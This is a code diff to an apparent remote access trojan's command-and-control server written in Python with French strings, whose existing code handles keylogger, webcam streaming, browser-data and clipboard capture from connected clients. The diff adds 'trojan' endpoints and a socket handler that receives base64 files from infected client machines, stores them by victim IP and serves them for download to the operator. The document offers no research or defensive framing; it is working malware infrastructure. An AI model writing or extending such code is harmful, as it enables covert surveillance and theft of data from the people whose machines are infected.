@@ -50,6 +50,7 @@ browser_ns = api.namespace('api/v1/browser', description='Browser data operation
 keylogger_ns = api.namespace('api/v1/keylogger', description='Keylogger operations')
 webcam_ns = api.namespace('api/v1/webcam', description='Webcam operations')
 papier_ns = api.namespace('api/v1/papier', description='Papier operations')
+trojan_ns = api.namespace('api/v1/trojan', description='Trojan operations')
 
 auth_model = api.model('Auth', {'secret_key': fields.String(required=True, description='Clé secrète')})
 command_model = api.model('Command', {
@@ -91,6 +92,11 @@ papier_model = api.model('Papier', {
     'id': fields.Integer(required=True, description='ID du papier'),
     'file_path': fields.String(required=True, description='Chemin du fichier du papier'),
     'date_created': fields.String(required=True, description='Date de création du papier')
+})
+trojan_model = api.model('Trojan', {
+    'id': fields.Integer(required=True, description='ID du trojan'),
+    'file_path': fields.String(required=True, description='Chemin du fichier du trojan'),
+    'date_created': fields.String(required=True, description='Date de création du trojan')
 })
 
 client_params = api.parser()
@@ -366,6 +372,30 @@ class StreamWebcam(Resource):
         return Response(stream_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')
 
 
+@trojan_ns.route('/client/<int:client_id>')
+class GetTrojansByClientId(Resource):
+    @jwt_required()
+    @api.doc(security='bearer_auth')
+    @trojan_ns.marshal_with(trojan_model, as_list=True)
+    def get(self, client_id):
+        trojans = Command.query.filter_by(client_id=client_id, type=CommandType.TROJAN).all()
+        for trojan in trojans:
+            trojan.date_created = trojan.date_created.strftime('%d/%m/%Y à %H:%M:%S')
+        return trojans, 200
+
+
+@trojan_ns.route('/trojan/<int:trojan_id>')
+class GetTrojanFile(Resource):
+    @jwt_required()
+    @api.doc(security='bearer_auth')
+    def get(self, trojan_id):
+        trojan = Command.query.get(trojan_id)
+        if trojan and os.path.exists(trojan.file_path):
+            return send_file(trojan.file_path, mimetype='application/octet-stream')
+        else:
+            return {'status': 'error', 'message': 'Fichier du trojan non trouvé.'}, 404
+
+
 @socketio.on('connect')
 def handle_connect():
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
@@ -505,6 +535,23 @@ def handle_clipboard(data):
 def handle_frame(data):
     frame_data = base64.b64decode(data.get('data'))
     video_frames.put(frame_data)
+
+
+@socketio.on('trojan_response')
+def handle_trojan(data):
+    sid = request.sid
+    client = Client.query.filter_by(sid=sid).first()
+    if client:
+        trojan_dir = f"trojans/{client.ip}"
+        os.makedirs(trojan_dir, exist_ok=True)
+        file_name = f"{datetime.now().strftime('%Y-%m-%d_%H')}.pdf"
+        trojan_path = f"{trojan_dir}/{file_name}"
+        with open(trojan_path, 'wb') as f:
+            f.write(base64.b64decode(data.get('trojan')))
+        new_command = Command(type=CommandType.TROJAN, client_id=client.id, file_path=trojan_path)
+        db.session.add(new_command)
+        db.session.commit()
+        app.logger.info(f"Trojan reçu de {client.ip} et enregistré sous {trojan_path}")
 
 
 @socketio.on('disconnect')
